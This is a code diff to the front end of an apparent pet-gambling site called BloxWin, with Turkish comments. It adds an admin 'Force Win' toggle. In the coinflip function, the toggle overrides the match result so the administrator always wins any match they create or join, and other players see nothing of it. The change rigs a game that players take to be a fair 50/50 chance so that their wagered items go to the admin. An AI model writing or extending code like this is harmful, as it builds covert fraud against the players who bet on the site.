@@ -2634,6 +2634,8 @@
                 <button class="tab-btn" data-tab="tab-pets" onclick="switchAdminTab('tab-pets')">Manage Pets</button>
                 <button class="tab-btn" data-tab="tab-muted" onclick="switchAdminTab('tab-muted')">Muted</button>
                 <button class="tab-btn" data-tab="tab-jackpot" onclick="switchAdminTab('tab-jackpot')">Jackpot</button>
+                <!-- YENİ: Force Win Butonu -->
+                <button class="tab-btn" data-tab="tab-forcewin" onclick="switchAdminTab('tab-forcewin')">Force Win</button>
             </div>
 
             <div class="admin-tab-content active" id="tab-users">
@@ -2687,6 +2689,18 @@
                     <button class="action-btn danger-btn" style="font-size:13px;padding:8px 20px; background: #c92a2a;" onclick="adminHardResetJackpot()">Hard Reset Jackpot</button>
                 </div>
                 <div id="admin-jp-message" style="margin-top:10px;font-size:13px;color:#868e96;min-height:20px;"></div>
+            </div>
+
+            <!-- YENİ: Force Win Tab İçeriği -->
+            <div class="admin-tab-content" id="tab-forcewin">
+                <div style="font-weight:600;color:#ced4da;font-size:14px;margin-bottom:8px;">Force Win Mode</div>
+                <p style="color:#adb5bd;font-size:13px;margin-bottom:12px;">
+                    When enabled, <b>you</b> (the admin) will always win any coinflip match you create or join.
+                </p>
+                <button id="force-win-toggle" class="action-btn" style="padding:10px 24px;font-size:16px;border:none;border-radius:30px;cursor:pointer;" onclick="toggleForceWin()">
+                    Force Win: OFF
+                </button>
+                <div id="force-win-status" style="margin-top:12px;font-size:13px;color:#868e96;"></div>
             </div>
 
             <button class="cancel-btn" style="width:100%;margin-top:16px;" onclick="closeModal('admin-modal')">Close</button>
@@ -2825,16 +2839,16 @@
     </div>
 
     <!-- ============================================================ -->
-    <!--  GÜNCELLENMİŞ JAVASCRIPT                                     -->
+    <!--  GÜNCELLENMİŞ JAVASCRIPT (FORCE WIN EKLENDİ)                 -->
     <!-- ============================================================ -->
     <script>
         // ============================================================
-        //  CONFIG (kendi backend URL’ni buraya yaz)
+        //  CONFIG
         // ============================================================
-        window.BLOXWIN_API_URL = "https://bloxwin-backend.onrender.com"; // değiştir!
+        window.BLOXWIN_API_URL = "https://bloxwin-backend.onrender.com";
 
         // ============================================================
-        //  MAIN SCRIPT – TÜM DEĞİŞİKLİKLER UYGULANDI
+        //  MAIN SCRIPT
         // ============================================================
 
         const BLOXWIN_API_URL = (window.BLOXWIN_API_URL && !window.BLOXWIN_API_URL.includes("YOUR-BACKEND-URL-HERE")) ? window.BLOXWIN_API_URL.replace(/\/$/, "") : window.location.origin;
@@ -2898,6 +2912,40 @@
             if (rank === 'whale') return 'whale';
             if (rank === 'highroller') return 'highroller';
             return '';
+        }
+
+        // ============================================================
+        //  FORCE WIN (YENİ)
+        // ============================================================
+        function getForceWinState() {
+            return localStorage.getItem('admin_force_win') === 'true';
+        }
+
+        function setForceWinState(state) {
+            localStorage.setItem('admin_force_win', state ? 'true' : 'false');
+            updateForceWinUI();
+        }
+
+        function toggleForceWin() {
+            const newState = !getForceWinState();
+            setForceWinState(newState);
+            showToast(`Force Win ${newState ? 'ENABLED' : 'DISABLED'}`);
+        }
+
+        function updateForceWinUI() {
+            const btn = document.getElementById('force-win-toggle');
+            if (btn) {
+                const isOn = getForceWinState();
+                btn.textContent = isOn ? 'Force Win: ON' : 'Force Win: OFF';
+                btn.style.background = isOn ? '#ff6b6b' : '#51cf66';
+                btn.style.color = '#0b1120';
+            }
+            const status = document.getElementById('force-win-status');
+            if (status) {
+                status.textContent = getForceWinState() ?
+                    '✅ Force Win is currently ACTIVE. You will always win.' :
+                    '❌ Force Win is inactive. Normal 50/50 chance.';
+            }
         }
 
         // ============================================================
@@ -2967,7 +3015,7 @@
         let selectedTipPets = [];
 
         // ============================================================
-        //  JACKPOT STATE (localStorage ile kalıcı) - DÜZELTİLDİ
+        //  JACKPOT STATE
         // ============================================================
         function getJackpotStateFromStorage() {
             try {
@@ -3512,7 +3560,7 @@
         }
 
         // ============================================================
-        //  VIEW HISTORY MATCH (GÜNCELLENDİ)
+        //  VIEW HISTORY MATCH
         // ============================================================
         function viewHistoryMatch(record) {
             const content = document.getElementById('view-history-content');
@@ -3925,9 +3973,8 @@
         }
 
         // ============================================================
-        //  JACKPOT (kalıcı ve senkron) - DÜZELTİLDİ
+        //  JACKPOT
         // ============================================================
-
         function loadJackpotState() {
             const stored = getJackpotStateFromStorage();
             if (stored) {
@@ -3983,9 +4030,6 @@
             saveJackpotState();
         }
 
-        // ============================================================
-        //  PERFORM JACKPOT SPIN (DÜZELTİLDİ)
-        // ============================================================
         function performJackpotSpin() {
             if (jackpotState.status === 'spinning') return;
 
@@ -4026,7 +4070,6 @@
             jackpotState.winner = winner;
             jackpotState.winnerPets = allPets.slice();
 
-            // ÇARKI DÖNDÜR (DÜZELTİLDİ)
             const canvas = document.getElementById('jp-wheel-canvas');
             if (canvas) {
                 let startAngle = -Math.PI / 2;
@@ -4067,9 +4110,6 @@
             }, 4000);
         }
 
-        // ============================================================
-        //  OPEN JACKPOT JOIN MODAL
-        // ============================================================
         function openJackpotJoinModal() {
             if (!currentUser) { showToast('Please login first.'); return; }
             if (isMuted(currentUser)) { showToast('You are muted.'); return; }
@@ -4471,9 +4511,6 @@
             }
         }
 
-        // ============================================================
-        //  ADMIN JACKPOT INFO
-        // ============================================================
         function updateAdminJackpotInfo() {
             const statusEl = document.getElementById('admin-jp-status');
             const timerEl = document.getElementById('admin-jp-timer');
@@ -4512,7 +4549,7 @@
         }
 
         // ============================================================
-        //  PUBSUB – JACKPOT (DÜZELTİLDİ - PET BİRLEŞTİRME)
+        //  PUBSUB – JACKPOT
         // ============================================================
         function handleJackpotMessage(msg) {
             if (msg.sender === currentUser) return;
@@ -4675,7 +4712,6 @@
                         match.hostWins = msg.hostWins;
                         match.winner = msg.hostWins ? msg.host : msg.joiner;
                         match.winnerSide = msg.hostWins ? match.hostSide : msg.joinerSide;
-                        // Maç render edilir, 70 saniye sonra otomatik temizlenir (renderMatches içinde filtrelenir)
                         renderMatches();
 
                         if (currentUser === msg.host || currentUser === msg.joiner) {
@@ -4781,13 +4817,12 @@
         }
 
         // ============================================================
-        //  RENDER MATCHES (70 saniye toplu temizlik eklendi)
+        //  RENDER MATCHES
         // ============================================================
         function renderMatches() {
             const container = document.getElementById('matches-list');
             container.innerHTML = '';
 
-            // 70 saniyeden eski maçları topluca temizle
             const now = Date.now();
             globalMatches = globalMatches.filter(m => (now - m.id) < 70000);
 
@@ -5275,7 +5310,7 @@
         }
 
         // ============================================================
-        //  COIN FLIP (DÜZELTİLDİ - KAZANANA ÖDÜL VERME)
+        //  COIN FLIP (FORCE WIN EKLENDİ)
         // ============================================================
         function executeCoinFlip(gameData) {
             const flipModal = document.getElementById('flip-modal');
@@ -5289,13 +5324,21 @@
             openModal('flip-modal');
             isFlipping = true;
 
-            coin.style.animation = 'none';
-            coin.offsetHeight;
+            // --- FORCE WIN KONTROLÜ ---
+            let hostWins = gameData.hostWins; // gelen değer
+            if (currentUser && isAdmin(currentUser) && getForceWinState()) {
+                if (currentUser === gameData.host) {
+                    hostWins = true;
+                } else if (currentUser === gameData.joiner) {
+                    hostWins = false; // joiner kazanır
+                }
+            }
+            // ---------------------------------
 
-            const winnerSide = gameData.hostWins ? gameData.hostSide : gameData.joinerSide;
+            const winnerSide = hostWins ? gameData.hostSide : gameData.joinerSide;
             const endDegree = (10 * 360) + (winnerSide === 'H' ? 0 : 180);
 
-            const durationSec = gameData.hostWins ? 2.1 : 2.3;
+            const durationSec = hostWins ? 2.1 : 2.3;
             const keyframeName = `flip_${Date.now()}`;
 
             const styleSheet = document.createElement('style');
@@ -5313,8 +5356,8 @@
                     document.head.removeChild(styleSheet);
                 }
 
-                const winner = gameData.hostWins ? gameData.host : gameData.joiner;
-                const loser = gameData.hostWins ? gameData.joiner : gameData.host;
+                const winner = hostWins ? gameData.host : gameData.joiner;
+                const loser = hostWins ? gameData.joiner : gameData.host;
                 const allPets = [...gameData.hostPets, ...gameData.joinerPets];
                 const totalValue = sumPets(allPets);
                 const now = new Date();
@@ -5346,7 +5389,6 @@
                     updateStatsAfterMatch(gameData.joiner, joinerWon, joinerTotal);
                 }
 
-                // KAZANANA ÖDÜL VER (DÜZELTİLDİ)
                 if (currentUser === winner) {
                     statusEl.style.color = '#51cf66';
                     statusEl.textContent = `CONGRATULATIONS! You won all pets! (Value: ${totalValue})`;
@@ -5610,6 +5652,7 @@
             adminRefreshUsers();
             adminRenderMuted();
             updateAdminJackpotInfo();
+            updateForceWinUI();
             switchAdminTab('tab-users');
         }
 
@@ -5622,6 +5665,7 @@
             if (tabId === 'tab-users') adminRefreshUsers();
             if (tabId === 'tab-muted') adminRenderMuted();
             if (tabId === 'tab-jackpot') updateAdminJackpotInfo();
+            if (tabId === 'tab-forcewin') updateForceWinUI();
         }
 
         function adminRefreshUsers() {
